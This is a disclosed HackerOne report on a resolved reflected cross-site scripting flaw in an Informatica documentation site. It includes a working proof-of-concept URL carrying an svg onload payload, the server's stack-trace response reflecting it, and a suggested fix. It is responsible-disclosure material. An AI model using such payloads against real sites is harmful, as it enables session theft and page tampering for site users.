---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-reflected
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Reflected"
enriched: true
body: true
date: 2022-07-23
submitted: 2017-05-26T22:19:51.680Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/informatica|Informatica]]"
reporter: "bigbear_"
source: "https://hackerone.com/reports/232320"
title: "[doc.rt.informaticacloud.com] Reflected XSS via Stack Strace"
---
# [doc.rt.informaticacloud.com] Reflected XSS via Stack Strace

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Informatica | **Disclosed:** 2022-07-23

- Report: [https://hackerone.com/reports/232320](https://hackerone.com/reports/232320)
- CWE: Cross-site Scripting (XSS) - Reflected
- Submitted: 2017-05-26T22:19:51.680Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello.

###PoC for reflected XSS:

`http://doc.rt.informaticacloud.com/infocenter/ActiveVOS/v92/nav/7_1_2_3_2_1<svg/onload=alert(document.domain)>`

###Response:

```
<body><h2>HTTP ERROR 500</h2>
<p>Problem accessing /help/nav/7_1_2_3_2_1%3Csvg/onload=alert(document.domain)%3E. Reason:
<pre>    For input string: "1&lt;svg/onload=alert(document.domain)&gt;"</pre></p><h3>Caused by:</h3><pre>java.lang.NumberFormatException: For input string: "1<svg/onload=alert(document.domain)>"
	at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65)
	at java.lang.Integer.parseInt(Integer.java:492)
	at java.lang.Integer.parseInt(Integer.java:527)
	at org.eclipse.help.internal.webapp.servlet.NavServlet.getTopic(NavServlet.java:90)
	at org.eclipse.help.internal.webapp.servlet.NavServlet.doGet(NavServlet.java:56)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:707)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:820)
	at org.eclipse.equinox.http.registry.internal.ServletManager$ServletWrapper.service(ServletManager.java:180)
	at org.eclipse.equinox.http.servlet.internal.ServletRegistration.handleRequest(ServletRegistration.java:90)
	at org.eclipse.equinox.http.servlet.internal.ProxyServlet.processAlias(ProxyServlet.java:111)
	at org.eclipse.equinox.http.servlet.internal.ProxyServlet.service(ProxyServlet.java:67)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:820)
	at org.eclipse.equinox.http.jetty.internal.HttpServerManager$InternalHttpServiceServlet.service(HttpServerManager.java:318)
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:502)
	at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:380)
	at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)
	at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:765)
	at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
	at org.mortbay.jetty.Server.handle(Server.java:324)
	at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:535)
	at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:865)
	at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:540)
	at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:213)
	at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:404)
	at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:409)
	at org.mortbay.thread.QueuedThreadPool$PoolThread.run(QueuedThreadPool.java:520)
```

It is succeful worked in IE/MozillaFirefox.
{F188420}

###Possible Fix:

Disable Stack Trace on this resource.

## Timeline

- **Report Filed**
- **2017-05-27** @tarantula_hawk: Dear @bigbear_ 
Thanks for reaching out.
We are looking into it.
- **Report Triaged**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
